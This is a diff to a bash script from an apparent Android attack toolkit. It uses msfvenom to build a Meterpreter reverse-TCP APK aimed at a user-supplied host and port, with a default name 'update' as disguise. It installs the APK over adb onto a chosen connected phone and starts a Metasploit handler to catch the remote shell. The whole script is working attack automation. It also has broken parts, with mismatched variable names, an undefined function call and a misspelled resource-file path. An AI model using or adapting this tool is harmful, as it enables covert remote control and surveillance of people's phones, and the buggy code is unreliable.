@@ -1,5 +1,40 @@
 #!/bin/bash
 
+adb devices | sed -n '2,$p' | awk '{ print $1 }' > .temp/dev_list_temp 2> /dev/null
+dev=(`cat .temp/dev_list_temp`)
+dev=("${dev[@]}")
+dev_1=$(echo "${dev[0]}")
+dev_2=$(echo "${dev[1]}")
+dev_3=$(echo "${dev[2]}")
+
+## DEVICE MODEL EXTARCT ##
+
+adb devices -l | grep model > .temp/dev_list_model_temp 2> /dev/null
+model=(`cat .temp/dev_list_model_temp`)
+model=("${model[@]}")
+mod_1=$(echo "${model[4]}" | cut -c 7- )
+mod_2=$(echo "${model[11]}" | cut -c 7- )
+mod_3=$(echo "${model[18]}" | cut -c 7- )
+
+if [ "$dev_1" == "" ]
+    then
+        total_dev=0
+    else
+        total_dev=1
+        if [ "$dev_2" == "" ]
+            then
+                total_dev=1
+            else
+                total_dev=2
+                if [ "$dev_3" == "" ]
+                    then
+                        total_dev=2
+                    else
+                        total_dev=3
+                fi
+        fi        
+fi
+
 clear
 echo -e "\n\e[1;93m
  ______               __                 __      ______                    __
@@ -8,22 +43,205 @@ echo -e "\n\e[1;93m
 |___|   |___._|___  ||__||_____|___._|_____|    |______||__| |_____|___._||____|_____|__|
               |_____|
 \e[0m"
-read -p $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost1
-read -p $'\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport1
-read -p $'\n\e[1;91mEnter the name of the Payload .apk file.\e[0m\e[1;93m : ' name
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 R> metasploit/$name.apk 2> /dev/null | echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m"
-echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name.apk\e[0m]"
-echo
+
+lhost_taker () {
+
+        read -p $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost1
+        if [ "$lhost1" == "" ]
+          then
+              echo -e "\e[91mPlease enter the IP address plz....\n"
+              lhost_taker
+        fi
+            
+}
+
+lport_taker () {
+
+        read -p $'\n\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport1
+        if [ "$lport1" == "" ]
+          then
+              echo -e "\e[91mPlease enter the PORT number plz....\n"
+              lport_taker
+        fi
+            
+}
+
+name_taker () {
+
+        read -p $'\n\n\e[1;91mEnter the name of Payload .apk file\e[0m\e[1;93m : ' name_apk
+        if [ "$name_apk" == "" ]
+          then
+              echo -e "\e[91mNo name was entered so taking name as update.apk....\n"
+              time=$(date +"%T")
+              name_apk="update-$time"
+        fi
+            
+}
+
+payload_creator () {
+
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 R> metasploit/$name.apk 2> /dev/null | echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m"
+        echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name_apk.apk\e[0m]"
+        to_install=0
+
+}
+
+apk_install () {
+
+        echo -e "\e[1;92mINSTALLING THE PAYLOAD\n"
+        if [ "$to_install" == "0" ]
+            then
+                adb -s $devv install -r $PWD/metasploit/$apk_name.apk &> /dev/null
+                if [ "$?" == "0" ]
+                    then
+                        echo -e "\n\e[1;92mSuccessfully installed the 'apk' into device $modd\n"
+                    else
+                        echo -e "\n\e[1;91mFailed installing the 'apk' into device $modd\n"
+                fi
+        fi
+}
+
+start_listner () {
+
+     echo -e "\e[1;92mStarting the MSF listner\n"
+     time=$(date +"%T")
+     echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost1\nset LPORT $lport1\nexploit" > $PWD/metasploit/.exploit-$time.rc
+     msfconsole -q -r $PWD/metasploit/.exploit$-time.rc
+
+}
 
 while true; do
   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/N) \e[91;1m? : \e[1;93m' yn
   case $yn in
   [Yy]* ) break;;
-  [Nn]* ) clear && bash modules/funtion2.sh;;
+  [Nn]* ) clear && bash modules/function2.sh;;
   * ) echo -e "\e[1;93mPlease answer it with\e[1;97m ( Y/N )\e[0m";;
   esac
-  done
-insta=$(adb install $PWD/metasploit/$name.apk)
-echo
-echo -e "\e[1;92mINSTALLING THE PACKAGE \e[1;91m$insta"
-bash modules/funtion2.sh
+done
+
+dev_1_payload_create () {
+
+                devv=$(echo $dev_1)
+                model=$(echo $mod_1)
+                lhost_taker
+                lport_taker
+                apk_name
+                while true; do
+                  read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) apk_install; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) apk_install; break;;
+                  esac
+                done
+                while true; do
+                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) start_listner; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) start_listner; break;;
+                  esac
+                done
+}
+
+dev_2_payload_create () {
+
+                devv=$(echo $dev_2)
+                model=$(echo $mod_2)
+                lhost_taker
+                lport_taker
+                apk_name
+                while true; do
+                  read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) apk_install; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) apk_install; break;;
+                  esac
+                done
+                while true; do
+                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) start_listner; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) start_listner; break;;
+                  esac
+                done
+}
+
+dev_3_payload_create () {
+
+                devv=$(echo $dev_3)
+                model=$(echo $mod_3)
+                lhost_taker
+                lport_taker
+                apk_name
+                while true; do
+                  read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) apk_install; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) apk_install; break;;
+                  esac
+                done
+                while true; do
+                  read -p $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
+                  case $yn in
+                  [Yy]* ) start_listner; break;;
+                  [Nn]* ) clear && bash modules/function2.sh;;
+                      * ) start_listner; break;;
+                  esac
+                done
+
+}
+
+if [ "$total_dev" ==  "0" ]
+    then
+        echo -e "\e[91;1mNO DEVICE CONNECTED"
+    else
+        if [ "$total_dev" == "1" ]
+            then
+                
+                dev_1_payload_create
+
+            else
+                if [ "$total_dev" == "2" ]
+                    then
+                        echo -e "\e[93mSelect the device :- \e[92m\n"
+                        echo -e "\e[93m1. \e[92m$dev_1 , \e[93mModel : \e[92m$mod_1"
+                        echo -e "\e[93m2. \e[92m$dev_2 , \e[93mModel : \e[92m$mod_2"
+                        while [ 1 ]; do
+                            read -p $'\n\e[1;4;91mEnter here\e[0m\e[24;1;97m : ' options
+                            case $options in
+                            "1") dev_1_payload_create; break;;
+                            "2") dev_2_payload_create; break;;
+                              *) echo -e "\n\e[1;4;91mENTER THE RIGHT OPTION BRO :- (1/2)\n";;
+                            esac
+                        done
+                    else
+                        if [ "$total_dev" == "3" ]
+                            then
+                                echo -e "\e[93mSelect the device :- \e[92m\n"
+                                echo -e "\e[93m1. \e[92m$dev_1 , \e[93mModel : \e[92m$mod_1"
+                                echo -e "\e[93m1. \e[92m$dev_2 , \e[93mModel : \e[92m$mod_2"
+                                echo -e "\e[93m1. \e[92m$dev_3 , \e[93mModel : \e[92m$mod_3"
+                        while [ 1 ]; do
+                            read -p $'\n\e[1;4;91mEnter here\e[0m\e[24;1;97m : ' options
+                            case $options in
+                            "1") dev_1_payload_create; break;;
+                            "2") dev_2_payload_create; break;;
+                            "3") dev_3_payload_create; break;;
+                              *) echo -e "\n\e[1;4;91mENTER THE RIGHT OPTION BRO :- (1/2/3/)\n";;
+                            esac
+                        done
+                        fi
+                fi  
+                        
+        fi
+fi
+read -p $'\n\e[93;1mDo you want to clear the screen \e[1;97m (y/N) \e[93;1m? : \e[1;91m' yn
+case $yn in
+  [Yy]* ) clear; bash modules/function2.sh;;
+  [Nn]* ) bash modules/function2.sh;;
+  * ) bash modules/function2.sh;;
+esac
